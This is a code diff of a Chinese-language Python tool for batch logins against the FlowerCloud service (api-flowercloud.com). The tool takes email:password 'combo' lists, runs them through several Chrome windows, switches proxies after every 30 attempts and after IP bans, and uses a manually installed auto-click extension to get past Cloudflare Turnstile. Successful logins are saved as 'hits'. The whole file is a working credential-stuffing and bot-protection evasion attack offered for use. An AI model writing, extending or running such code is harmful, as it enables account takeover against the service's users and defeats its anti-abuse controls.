@@ -1,20 +1,17 @@
 # -*- coding: utf-8 -*-
 """
 ============================================================
-  花云批量登录 v5.0 - 纯CDP过盾 (无需CRX插件)
+  花云批量登录 v5.1 - 手动加插件 + 不关浏览器切IP
 ============================================================
-  核心改进:
-  - 不再需要 .crx 插件文件
-  - 过盾逻辑完全内嵌 (cf_bypass.py)
-  - 用 DrissionPage CDP 直接穿透 shadow DOM 点击 checkbox
-  - 不关浏览器切换代理 (本地代理转发)
-
-  功能:
-  1. 内置 CDP 过盾 (复刻插件逻辑)
-  2. 多窗口并发 + 代理轮换
-  3. combo队列分发, 不重复不遗漏
-  4. 被ban自动换IP + 刷新过盾
-  5. XHR静默登录, 不刷新页面
+  架构:
+  Chrome(127.0.0.1:本地端口) → 本地SOCKS5转发器 → 上游代理(动态切换)
+  
+  流程:
+  1. 启动N个Chrome窗口 (每个连自己的本地转发端口)
+  2. 提示用户手动给每个窗口加过盾插件
+  3. 用户确认后, 开始批量登录
+  4. 每30条自动切IP: 转发器切上游 → 刷新页面 → 插件自动过盾
+  5. 浏览器全程不关闭!
 ============================================================
 """
 import sys
@@ -25,9 +22,6 @@ import re
 import threading
 import queue
 import gc
-import json
-import subprocess
-import signal
 
 try:
     from DrissionPage import ChromiumPage, ChromiumOptions
@@ -43,7 +37,7 @@ except ImportError:
     HAS_GUI = False
 
 from proxy_checker import Proxy, load_proxies_from_file
-from cf_bypass import wait_and_solve_cf, is_cf_challenge_present, solve_turnstile
+from local_proxy import LocalSocks5Forwarder
 
 # ============ 配置 ============
 TARGET_BASE = "https://api-flowercloud.com"
@@ -56,45 +50,33 @@ GOOD_FILE = "hits.txt"
 COMBO_PER_IP = 30
 DELAY_PER_REQ = 2.0
 BAN_WAIT = 180
-CF_WAIT_MAX = 60
+CF_WAIT_MAX = 90
 TOKEN_REFRESH_EVERY = 25
 MAX_WORKERS = 3
-BASE_PORT = 9300
+BASE_CHROME_PORT = 9300
+BASE_LOCAL_PROXY_PORT = 8100
 
 
 # ============ 工具函数 ============
-def get_script_dir():
-    return os.path.dirname(os.path.abspath(__file__))
-
-
 def save_result(filename, content):
     with open(filename, "a", encoding="utf-8") as f:
         f.write(content + "\n")
 
 
 def page_is_ready(page):
-    """判断页面是否真正加载完成 (不是CF challenge页)"""
+    """判断页面是否真正加载完成 (排除CF challenge页)"""
     try:
         html = page.html
-        if len(html) < 5000:
+        if not html or len(html) < 3000:
             return False
         html_lower = html.lower()
-        # CF challenge 页面的特征 - 如果有这些就说明还没过
-        cf_signs = [
-            'challenges.cloudflare.com',
-            'cf-turnstile',
-            'just a moment',
-            'checking your browser',
-            'cf_chl_opt',
-            'ray id',
-        ]
+        cf_signs = ['challenges.cloudflare.com', 'cf-turnstile', 'just a moment',
+                    'checking your browser', 'cf_chl_opt']
         for sign in cf_signs:
             if sign in html_lower:
                 return False
-        # 确认是花云真正的页面
         if 'clientarea' in html_lower or 'logout.php' in html_lower or 'inputemail' in html_lower:
             return True
-        # 如果内容够长且没有CF特征，也认为就绪
         if len(html) > 15000:
             return True
         return False
@@ -105,7 +87,7 @@ def page_is_ready(page):
 def is_banned(page):
     try:
         html = page.html
-        if len(html) < 3000:
+        if html and len(html) < 3000:
             h = html.lower()
             if "403 forbidden" in h or "openresty" in h or "429" in h or "been blocked" in h:
                 return True
@@ -131,9 +113,18 @@ def is_logged_in(page):
         return False
 
 
-def wait_cf_pass(page, max_wait=CF_WAIT_MAX, log_func=None):
-    """等待过盾 - 使用内置 CDP 过盾"""
-    return wait_and_solve_cf(page, max_wait=max_wait, log_func=log_func)
+def wait_for_page_ready(page, max_wait=CF_WAIT_MAX, log_func=None):
+    """等待页面就绪 (插件会自动过盾, 我们只需等)"""
+    start = time.time()
+    while time.time() - start < max_wait:
+        if is_banned(page):
+            if log_func:
+                log_func("[等待] 检测到封禁")
+            return False
+        if page_is_ready(page):
+            return True
+        time.sleep(3)
+    return page_is_ready(page)
 
 
 def logout_force(page):
@@ -241,76 +232,21 @@ def format_info(info):
 
 
 # ============================================================
-# 本地代理转发器 - 实现不关浏览器切换代理
-# ============================================================
-class LocalProxyForwarder:
-    """
-    本地 SOCKS5 转发代理
-    浏览器固定连接 127.0.0.1:local_port
-    通过 switch_upstream() 动态切换上游代理
-    
-    实现方式: 用 Python 起一个简单的 TCP 转发
-    每次 switch 时断开旧连接，新请求走新上游
-    """
-    
-    def __init__(self, local_port, log_func=None):
-        self.local_port = local_port
-        self.upstream_proxy = None  # Proxy 对象
-        self.log_func = log_func
-        self._server = None
-        self._running = False
-        self._lock = threading.Lock()
-        self._connections = []
-    
-    def log(self, msg):
-        if self.log_func:
-            self.log_func(f"[Proxy:{self.local_port}] {msg}")
-    
-    def switch_upstream(self, proxy):
-        """切换上游代理 (不关浏览器!)"""
-        with self._lock:
-            self.upstream_proxy = proxy
-            # 关闭所有现有连接，强制新请求走新上游
-            for conn in self._connections:
-                try:
-                    conn.close()
-                except Exception:
-                    pass
-            self._connections.clear()
-        self.log(f"已切换上游: {proxy.to_url() if proxy else '直连'}")
-    
-    def get_upstream(self):
-        with self._lock:
-            return self.upstream_proxy
-
-
-# ============================================================
-# 代理管理器 - 线程安全
+# 代理管理器
 # ============================================================
 class ProxyManager:
     def __init__(self, proxies):
         self.all_proxies = list(proxies)
         self.available = queue.Queue()
-        self.used = set()
         self.lock = threading.Lock()
         for p in self.all_proxies:
             self.available.put(p)
 
     def get_next(self):
         try:
-            proxy = self.available.get_nowait()
-            with self.lock:
-                self.used.add(proxy.to_url())
-            return proxy
+            return self.available.get_nowait()
         except queue.Empty:
             return None
-
-    def return_proxy(self, proxy):
-        with self.lock:
-            url = proxy.to_url()
-            if url in self.used:
-                self.used.discard(url)
-            self.available.put(proxy)
 
     def remaining(self):
         return self.available.qsize()
@@ -320,14 +256,12 @@ class ProxyManager:
 
 
 # ============================================================
-# 单窗口Worker - 不关浏览器版
+# 单窗口Worker - 不关浏览器!
 # ============================================================
 class WindowWorker:
     """
-    独立窗口Worker:
-    - 启动一次Chrome, 之后不再关闭
-    - 换IP通过 --proxy-server 重启 (因为Chrome不支持运行时换代理)
-    - 过盾用内置 CDP (不需要插件)
+    核心: 浏览器启动后永不关闭
+    切IP通过本地转发器切换上游, 然后刷新页面(插件自动过盾)
     """
 
     def __init__(self, worker_id, proxy_manager, combo_queue, result_lock,
@@ -339,7 +273,9 @@ class WindowWorker:
         self.stats = stats
         self.log_func = log_func
         self.page = None
-        self.port = BASE_PORT + worker_id
+        self.chrome_port = BASE_CHROME_PORT + worker_id
+        self.local_proxy_port = BASE_LOCAL_PROXY_PORT + worker_id
+        self.forwarder = None
         self.current_proxy = None
         self.running = True
         self.combo_count_on_ip = 0
@@ -351,17 +287,16 @@ class WindowWorker:
         else:
             print(full, flush=True)
 
-    def start_browser_with_proxy(self, proxy):
-        """
-        启动Chrome + 设置代理
-        不再需要加载任何插件!
-        """
-        self.close_browser()
-        self.current_proxy = proxy
-        self.combo_count_on_ip = 0
+    def start_forwarder(self):
+        """启动本地代理转发器"""
+        self.forwarder = LocalSocks5Forwarder(self.local_proxy_port, log_func=None)
+        self.forwarder.start()
+
+    def start_browser(self):
+        """启动Chrome (只启动一次, 之后不关!)"""
         try:
             co = ChromiumOptions()
-            co.set_local_port(self.port)
+            co.set_local_port(self.chrome_port)
             co.set_argument('--no-first-run')
             co.set_argument('--no-default-browser-check')
             co.set_argument('--disable-infobars')
@@ -370,135 +305,90 @@ class WindowWorker:
             co.set_argument('--no-sandbox')
             co.set_argument('--disable-sync')
             co.set_argument('--disable-translate')
-            # 静默 debugger 提示 (和插件 README 说的一样)
             co.set_argument('--silent-debugger-extension-api')
+            # 固定连接本地转发器 (永远不变!)
+            co.set_argument(f'--proxy-server=socks5://127.0.0.1:{self.local_proxy_port}')
 
-            # 设置代理
-            if proxy:
-                proxy_arg = proxy.to_selenium_arg()
-                co.set_argument(f'--proxy-server={proxy_arg}')
-
-            self.log(f"启动Chrome 端口{self.port} 代理:{proxy.to_url() if proxy else '直连'}")
+            self.log(f"启动Chrome 端口{self.chrome_port}, 代理→本地转发器:{self.local_proxy_port}")
             self.page = ChromiumPage(co)
             return True
         except Exception as e:
-            self.log(f"启动失败: {e}")
+            self.log(f"启动Chrome失败: {e}")
             return False
 
-    def close_browser(self):
-        try:
-            if self.page:
-                self.page.quit()
-        except Exception:
-            pass
-        self.page = None
-        gc.collect()
-
-    def init_page_and_verify(self):
-        """打开花云页面, 用内置CDP过盾, 验证能正常登录"""
-        if not self.page:
-            return False
-        try:
-            self.page.get(TARGET_PAGE)
-            time.sleep(5)  # 给页面更多加载时间
-
-            if is_banned(self.page):
-                self.log("此IP已被封")
-                return False
-
-            # 检查是否需要过盾
-            if not page_is_ready(self.page):
-                # 检查是否是 CF challenge
-                html_lower = self.page.html.lower() if self.page.html else ''
-                if 'challenges.cloudflare.com' in html_lower or 'just a moment' in html_lower or 'cf-turnstile' in html_lower:
-                    self.log("检测到 CF Turnstile, 尝试过盾...")
-                    if not wait_cf_pass(self.page, max_wait=CF_WAIT_MAX, log_func=self.log):
-                        self.log("过盾失败")
-                        return False
-                else:
-                    # 可能是代理连不上或者页面还在加载
-                    self.log("页面未就绪, 等待中...")
-                    start = time.time()
-                    while time.time() - start < 30:
-                        time.sleep(3)
-                        if page_is_ready(self.page):
-                            break
-                        if is_banned(self.page):
-                            self.log("此IP已被封")
-                            return False
-                        # 再检查一次是否出现了 CF challenge
-                        html_lower = self.page.html.lower() if self.page.html else ''
-                        if 'challenges.cloudflare.com' in html_lower or 'cf-turnstile' in html_lower:
-                            self.log("检测到 CF Turnstile, 尝试过盾...")
-                            if wait_cf_pass(self.page, max_wait=CF_WAIT_MAX, log_func=self.log):
-                                break
-                            else:
-                                return False
-                    
-                    if not page_is_ready(self.page):
-                        self.log("等待超时, 页面未就绪")
-                        return False
-
-            if is_logged_in(self.page):
-                logout_force(self.page)
-                time.sleep(1)
-
-            if has_login_form(self.page) or reload_form_silent(self.page):
-                self.log("页面就绪, 可以开始登录 ✓")
-                return True
-
-            # 最后尝试: 可能页面加载了但DOM不同
-            time.sleep(3)
-            if has_login_form(self.page) or reload_form_silent(self.page):
-                self.log("页面就绪 (延迟加载), 可以开始登录 ✓")
-                return True
-
-            self.log("无法获取登录表单")
-            return False
-        except Exception as e:
-            self.log(f"init异常: {e}")
-            return False
-
-    def switch_to_next_ip(self):
-        """切换到下一个代理 (需要重启浏览器)"""
-        self.close_browser()
+    def switch_ip(self):
+        """
+        切换IP (不关浏览器!):
+        1. 从代理池取下一个代理
+        2. 转发器切换上游
+        3. 刷新页面 (插件自动过盾)
+        4. 等待页面就绪
+        """
         proxy = self.proxy_manager.get_next()
         if not proxy:
-            self.log("没有更多可用代理了!")
+            self.log("没有更多可用代理!")
             return False
 
-        if not self.start_browser_with_proxy(proxy):
-            return self.switch_to_next_ip()
+        self.current_proxy = proxy
+        self.combo_count_on_ip = 0
 
-        if not self.init_page_and_verify():
-            self.log(f"代理 {proxy.to_url()} 无法访问花云, 换下一个")
-            self.close_browser()
-            return self.switch_to_next_ip()
+        # 切换转发器上游
+        self.forwarder.switch_upstream(proxy.host, proxy.port)
+        self.log(f"切换IP -> {proxy.to_url()}")
 
-        return True
+        # 刷新页面 (插件会自动过盾)
+        try:
+            self.page.get(TARGET_PAGE)
+        except Exception:
+            pass
+
+        time.sleep(5)
+
+        # 等待页面就绪 (插件过盾中...)
+        if not wait_for_page_ready(self.page, max_wait=CF_WAIT_MAX, log_func=self.log):
+            if is_banned(self.page):
+                self.log("此IP被封, 换下一个")
+                return self.switch_ip()  # 递归换下一个
+            self.log("过盾超时, 换下一个IP")
+            return self.switch_ip()
+
+        # 页面就绪
+        if is_logged_in(self.page):
+            logout_force(self.page)
+            time.sleep(1)
+
+        if has_login_form(self.page) or reload_form_silent(self.page):
+            self.log(f"IP切换成功, 页面就绪 ✓ ({proxy.host})")
+            return True
+
+        # 再试一次
+        time.sleep(3)
+        if has_login_form(self.page) or reload_form_silent(self.page):
+            self.log(f"IP切换成功 ✓ ({proxy.host})")
+            return True
+
+        self.log("切换后无法获取登录表单, 换下一个")
+        return self.switch_ip()
 
     def handle_ban(self):
-        """被封处理: 等180s + 换新IP"""
+        """被封处理"""
         with self.result_lock:
             self.stats["bans"] += 1
-
         self.log(f"被封! 等{BAN_WAIT}s后换新IP...")
         waited = 0
         while waited < BAN_WAIT and self.running:
             chunk = min(30, BAN_WAIT - waited)
             time.sleep(chunk)
             waited += chunk
-            if BAN_WAIT - waited > 0:
-                self.log(f"  等待中...剩{BAN_WAIT - waited}s")
-
         if not self.running:
             return False
-        return self.switch_to_next_ip()
+        return self.switch_ip()
 
     def run(self):
         """主循环"""
-        if not self.switch_to_next_ip():
-            self.log("无法获取可用代理, 退出")
+        # 第一次切IP
+        if not self.switch_ip():
+            self.log("无可用代理, 退出")
             return
 
         batch_count = 0
@@ -512,19 +402,16 @@ class WindowWorker:
             # 检查是否需要换IP
             if self.combo_count_on_ip >= COMBO_PER_IP:
                 self.log(f"已跑{self.combo_count_on_ip}条, 换新IP...")
-                if not self.switch_to_next_ip():
+                if not self.switch_ip():
                     self.combo_queue.put((idx, email, password))
-                    self.log("无更多代理, 退出")
                     break
 
             # 定期刷新token
             if batch_count > 0 and batch_count % TOKEN_REFRESH_EVERY == 0:
                 if not reload_form_silent(self.page):
                     self.page.get(TARGET_PAGE)
-                    time.sleep(3)
-                    # 可能需要重新过盾
-                    if not page_is_ready(self.page):
-                        wait_cf_pass(self.page, max_wait=30, log_func=self.log)
+                    time.sleep(5)
+                    wait_for_page_ready(self.page, max_wait=30)
                     if is_logged_in(self.page):
                         logout_force(self.page)
                         time.sleep(1)
@@ -587,7 +474,16 @@ class WindowWorker:
             time.sleep(random.uniform(DELAY_PER_REQ * 0.85, DELAY_PER_REQ * 1.15))
 
         self.log("工作结束")
-        self.close_browser()
+
+    def cleanup(self):
+        """清理 (仅在程序退出时)"""
+        if self.forwarder:
+            self.forwarder.stop()
+        try:
+            if self.page:
+                self.page.quit()
+        except Exception:
+            pass
 
 
 
@@ -617,14 +513,14 @@ class MultiWindowEngine:
         else:
             print(msg, flush=True)
 
-    def start(self):
-        self.running = True
-        for i, (email, password) in enumerate(self.combos):
-            self.combo_queue.put((i, email, password))
-
-        self.log(f"[引擎] Combo: {len(self.combos)} | 代理: {self.proxy_manager.total()} | 窗口: {self.max_workers}")
-        self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条")
-        self.log(f"[引擎] 过盾方式: 内置CDP (无需CRX插件)")
+    def setup_browsers(self):
+        """
+        第一步: 启动所有浏览器窗口
+        返回成功启动的 worker 列表
+        """
+        self.log(f"\n{'='*55}")
+        self.log(f"  正在启动 {self.max_workers} 个浏览器窗口...")
+        self.log(f"{'='*55}\n")
 
         for wid in range(self.max_workers):
             worker = WindowWorker(
@@ -635,11 +531,38 @@ class MultiWindowEngine:
                 stats=self.stats,
                 log_func=self.log_func
             )
-            self.workers.append(worker)
+            # 启动本地转发器
+            worker.start_forwarder()
+            time.sleep(0.5)
+
+            # 启动浏览器
+            if worker.start_browser():
+                self.workers.append(worker)
+                self.log(f"  [窗口 {wid}] Chrome 已启动 (端口:{worker.chrome_port})")
+            else:
+                self.log(f"  [窗口 {wid}] 启动失败!")
+                worker.cleanup()
+
+            time.sleep(2)
+
+        return len(self.workers) > 0
+
+    def start_work(self):
+        """第三步: 开始批量工作"""
+        self.running = True
+        for i, (email, password) in enumerate(self.combos):
+            self.combo_queue.put((i, email, password))
+
+        self.log(f"\n[引擎] 开始工作!")
+        self.log(f"[引擎] Combo: {len(self.combos)} | 代理: {self.proxy_manager.total()} | 窗口: {len(self.workers)}")
+        self.log(f"[引擎] 每IP跑 {COMBO_PER_IP} 条 | 切IP不关浏览器")
+        self.log(f"[引擎] 过盾: 依赖手动加载的CRX插件\n")
+
+        for worker in self.workers:
             t = threading.Thread(target=worker.run, daemon=True)
             self.threads.append(t)
             t.start()
-            time.sleep(5)
+            time.sleep(3)
 
         threading.Thread(target=self._monitor, daemon=True).start()
 
@@ -648,6 +571,10 @@ class MultiWindowEngine:
         for w in self.workers:
             w.running = False
         self.log("[引擎] 停止中...")
+
+    def cleanup_all(self):
+        for w in self.workers:
+            w.cleanup()
 
     def _monitor(self):
         for t in self.threads:
@@ -661,13 +588,97 @@ class MultiWindowEngine:
 
 
 # ============================================================
-# GUI 界面
+# CLI模式 (主入口)
+# ============================================================
+def run_cli():
+    print("\n" + "=" * 60)
+    print("  花云批量登录 v5.1")
+    print("  手动加插件 + 不关浏览器自动切IP")
+    print("=" * 60)
+    print("\n  工作原理:")
+    print("  1. 启动N个Chrome, 每个连本地代理转发器")
+    print("  2. 你手动给每个窗口加过盾插件")
+    print("  3. 按Enter开始 → 自动切IP+过盾+登录")
+    print("  4. 全程不关浏览器!\n")
+
+    proxy_file = input(f"代理文件 (默认 {PROXY_FILE}): ").strip() or PROXY_FILE
+    proxies = load_proxies_from_file(proxy_file)
+    if not proxies:
+        print("[!] 无代理")
+        sys.exit(1)
+
+    combo_file = input(f"Combo文件 (默认 {COMBO_FILE}): ").strip() or COMBO_FILE
+    combos = []
+    try:
+        content = None
+        for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
+            try:
+                with open(combo_file, "r", encoding=enc) as f:
+                    content = f.read()
+                break
+            except (UnicodeDecodeError, UnicodeError):
+                continue
+        if content:
+            for line in content.splitlines():
+                line = line.strip()
+                if line and ":" in line:
+                    parts = line.split(":", 1)
+                    combos.append((parts[0].strip(), parts[1].strip()))
+    except Exception as e:
+        print(f"[!] 加载combo失败: {e}")
+        sys.exit(1)
+
+    if not combos:
+        print("[!] combo为空")
+        sys.exit(1)
+
+    workers_count = int(input(f"窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)
+
+    print(f"\n  代理: {len(proxies)} | Combo: {len(combos)} | 窗口: {workers_count}\n")
+
+    engine = MultiWindowEngine(proxies=proxies, combos=combos, max_workers=workers_count)
+
+    # === 第一步: 启动浏览器 ===
+    if not engine.setup_browsers():
+        print("[!] 没有成功启动任何浏览器!")
+        sys.exit(1)
+
+    # === 第二步: 等待用户手动加插件 ===
+    print("\n" + "=" * 60)
+    print("  ⚠️  请手动操作:")
+    print(f"  已打开 {len(engine.workers)} 个Chrome窗口")
+    print("  请给每个窗口安装过盾插件 (cf-autoclick-master)")
+    print("")
+    print("  方法: 将插件文件夹拖入 chrome://extensions")
+    print("        或加载已解压的扩展程序")
+    print("=" * 60)
+    input("\n  >>> 所有窗口都加好插件后, 按 ENTER 开始运行 <<<\n")
+
+    # === 第三步: 开始工作 ===
+    engine.start_work()
+
+    try:
+        while engine.running:
+            time.sleep(5)
+            s = engine.stats
+            remaining = engine.proxy_manager.remaining()
+            print(f"  [进度:{s['processed']}/{s['total']} "
+                  f"击中:{s['hits']} 失败:{s['failed']} "
+                  f"封:{s['bans']} 剩余代理:{remaining}]")
+    except KeyboardInterrupt:
+        engine.stop()
+    finally:
+        engine.cleanup_all()
+
+
+# ============================================================
+# GUI模式
 # ============================================================
 if HAS_GUI:
     class FlowerLoginApp(ctk.CTk):
         def __init__(self):
             super().__init__()
-            self.title("花云批量登录 v5.0 - 内置CDP过盾 (无需插件)")
+            self.title("花云批量登录 v5.1 - 手动加插件 + 不关浏览器切IP")
             self.geometry("1100x750")
             self.minsize(1000, 650)
             ctk.set_appearance_mode("dark")
@@ -679,13 +690,11 @@ if HAS_GUI:
             top = ctk.CTkFrame(self)
             top.pack(fill="x", padx=10, pady=(10, 5))
 
-            # Row 1: 提示信息 (不再需要选择插件!)
             r0 = ctk.CTkFrame(top, fg_color="transparent")
             r0.pack(fill="x", padx=10, pady=4)
-            ctk.CTkLabel(r0, text="v5.0 内置CDP过盾 - 无需加载CRX插件",
+            ctk.CTkLabel(r0, text="v5.1 手动加插件 + 不关浏览器自动切IP",
                          font=("", 13, "bold"), text_color="#00E676").pack(side="left")
 
-            # Row 2: 文件选择
             r1 = ctk.CTkFrame(top, fg_color="transparent")
             r1.pack(fill="x", padx=10, pady=4)
             ctk.CTkLabel(r1, text="代理文件:").pack(side="left")
@@ -697,7 +706,6 @@ if HAS_GUI:
             ctk.CTkEntry(r1, textvariable=self.combo_var, width=250).pack(side="left", padx=5)
             ctk.CTkButton(r1, text="浏览", width=50, command=self._pick_combo).pack(side="left")
 
-            # Row 3: 参数
             r2 = ctk.CTkFrame(top, fg_color="transparent")
             r2.pack(fill="x", padx=10, pady=4)
             ctk.CTkLabel(r2, text="窗口数:").pack(side="left")
@@ -707,18 +715,19 @@ if HAS_GUI:
             self.per_ip_var = ctk.StringVar(value="30")
             ctk.CTkEntry(r2, textvariable=self.per_ip_var, width=40).pack(side="left", padx=(5, 15))
 
-            # Row 4: 按钮
             r3 = ctk.CTkFrame(top, fg_color="transparent")
             r3.pack(fill="x", padx=10, pady=4)
-            self.btn_start = ctk.CTkButton(r3, text="开始运行", width=100, fg_color="#4CAF50", command=self._start)
+            self.btn_setup = ctk.CTkButton(r3, text="1.启动浏览器", width=120, fg_color="#2196F3", command=self._setup)
+            self.btn_setup.pack(side="left", padx=5)
+            self.btn_start = ctk.CTkButton(r3, text="2.开始运行", width=100, fg_color="#4CAF50",
+                                           command=self._start, state="disabled")
             self.btn_start.pack(side="left", padx=5)
             self.btn_stop = ctk.CTkButton(r3, text="停止", width=80, fg_color="#F44336", command=self._stop)
             self.btn_stop.pack(side="left", padx=5)
-            self.status_lbl = ctk.CTkLabel(r3, text="就绪 - CDP过盾已内置",
-                                           text_color="#00E676", font=("", 12, "bold"))
+            self.status_lbl = ctk.CTkLabel(r3, text="第1步: 点击[启动浏览器]",
+                                           text_color="#FFEB3B", font=("", 12, "bold"))
             self.status_lbl.pack(side="right", padx=10)
 
-            # 统计
             info = ctk.CTkFrame(self)
             info.pack(fill="x", padx=10, pady=5)
             self.lbl_progress = ctk.CTkLabel(info, text="进度: 0/0")
@@ -732,12 +741,10 @@ if HAS_GUI:
             self.lbl_proxies = ctk.CTkLabel(info, text="剩余代理: 0")
             self.lbl_proxies.pack(side="left", padx=10)
 
-            # 进度条
             self.pbar = ctk.CTkProgressBar(self, height=8)
             self.pbar.pack(fill="x", padx=10, pady=4)
             self.pbar.set(0)
 
-            # 日志
             lf = ctk.CTkFrame(self)
             lf.pack(fill="both", expand=True, padx=10, pady=(5, 10))
             self.log_box = ctk.CTkTextbox(lf, font=("Consolas", 11))
@@ -773,13 +780,13 @@ if HAS_GUI:
                     self.pbar.set(s['processed'] / s['total'])
             self.after(1000, self._refresh_stats)
 
-        def _start(self):
+        def _setup(self):
+            """启动浏览器"""
             proxies = load_proxies_from_file(self.proxy_var.get())
             if not proxies:
                 messagebox.showwarning("提示", "代理文件为空!")
                 return
 
-            # 加载combo
             combos = []
             combo_path = self.combo_var.get()
             try:
@@ -800,7 +807,6 @@ if HAS_GUI:
             except Exception as e:
                 messagebox.showwarning("错误", f"加载combo失败: {e}")
                 return
-
             if not combos:
                 messagebox.showwarning("提示", "Combo为空!")
                 return
@@ -809,16 +815,40 @@ if HAS_GUI:
             COMBO_PER_IP = int(self.per_ip_var.get() or 30)
             workers = int(self.workers_var.get() or 3)
 
-            self._log(f"[启动] 代理:{len(proxies)} | Combo:{len(combos)} | 窗口:{workers}")
-            self._log(f"[启动] 过盾: 内置CDP (无需CRX插件)")
-            self.status_lbl.configure(text="运行中...", text_color="#00E676")
-            self.btn_start.configure(state="disabled")
-
             self.engine = MultiWindowEngine(
                 proxies=proxies, combos=combos,
                 max_workers=workers, log_func=self._log
             )
-            threading.Thread(target=self.engine.start, daemon=True).start()
+
+            self._log("[第1步] 正在启动浏览器...")
+            self.btn_setup.configure(state="disabled")
+
+            def do_setup():
+                ok = self.engine.setup_browsers()
+                def update():
+                    if ok:
+                        n = len(self.engine.workers)
+                        self._log(f"\n[第2步] 已启动 {n} 个窗口!")
+                        self._log("  请手动给每个窗口安装过盾插件")
+                        self._log("  然后点击 [2.开始运行]\n")
+                        self.status_lbl.configure(text=f"已启动{n}个窗口, 请加插件后点[开始运行]",
+                                                  text_color="#FFEB3B")
+                        self.btn_start.configure(state="normal")
+                    else:
+                        self._log("[!] 启动失败!")
+                        self.btn_setup.configure(state="normal")
+                self.after(0, update)
+
+            threading.Thread(target=do_setup, daemon=True).start()
+
+        def _start(self):
+            """开始运行"""
+            if not self.engine:
+                return
+            self._log("[第3步] 开始批量登录!")
+            self.status_lbl.configure(text="运行中...", text_color="#00E676")
+            self.btn_start.configure(state="disabled")
+            threading.Thread(target=self.engine.start_work, daemon=True).start()
 
         def _stop(self):
             if self.engine:
@@ -826,71 +856,6 @@ if HAS_GUI:
             self.status_lbl.configure(text="已停止", text_color="#F44336")
             self.btn_start.configure(state="normal")
             self._log("[停止]")
-
-
-# ============================================================
-# CLI模式
-# ============================================================
-def run_cli():
-    print("\n" + "=" * 55)
-    print("  花云批量登录 v5.0 - 内置CDP过盾 (无需CRX插件)")
-    print("=" * 55)
-    print("  过盾方式: 纯CDP (复刻插件逻辑, 无需手动加载)")
-    print()
-
-    proxy_file = input(f"代理文件 (默认 {PROXY_FILE}): ").strip() or PROXY_FILE
-    proxies = load_proxies_from_file(proxy_file)
-    if not proxies:
-        print("[!] 无代理")
-        sys.exit(1)
-
-    combo_file = input(f"Combo文件 (默认 {COMBO_FILE}): ").strip() or COMBO_FILE
-    combos = []
-    try:
-        content = None
-        for enc in ["utf-8-sig", "utf-8", "gbk", "latin-1"]:
-            try:
-                with open(combo_file, "r", encoding=enc) as f:
-                    content = f.read()
-                break
-            except (UnicodeDecodeError, UnicodeError):
-                continue
-        if content:
-            for line in content.splitlines():
-                line = line.strip()
-                if line and ":" in line:
-                    parts = line.split(":", 1)
-                    combos.append((parts[0].strip(), parts[1].strip()))
-    except Exception as e:
-        print(f"[!] 加载combo失败: {e}")
-        sys.exit(1)
-
-    if not combos:
-        print("[!] combo为空")
-        sys.exit(1)
-
-    workers = int(input(f"窗口数 (默认{MAX_WORKERS}): ").strip() or MAX_WORKERS)
-
-    print(f"\n{'='*55}")
-    print(f"  代理: {len(proxies)} | Combo: {len(combos)} | 窗口: {workers}")
-    print(f"  过盾: 内置CDP (自动穿透Shadow DOM点击checkbox)")
-    print(f"  每IP: {COMBO_PER_IP} 条后自动换")
-    print(f"{'='*55}\n")
-
-    engine = MultiWindowEngine(
-        proxies=proxies, combos=combos, max_workers=workers
-    )
-    engine.start()
-    try:
-        while engine.running:
-            time.sleep(5)
-            s = engine.stats
-            remaining = engine.proxy_manager.remaining()
-            print(f"  [进度:{s['processed']}/{s['total']} "
-                  f"击中:{s['hits']} 失败:{s['failed']} "
-                  f"封:{s['bans']} 剩余代理:{remaining}]")
-    except KeyboardInterrupt:
-        engine.stop()
 
 
 # ============================================================
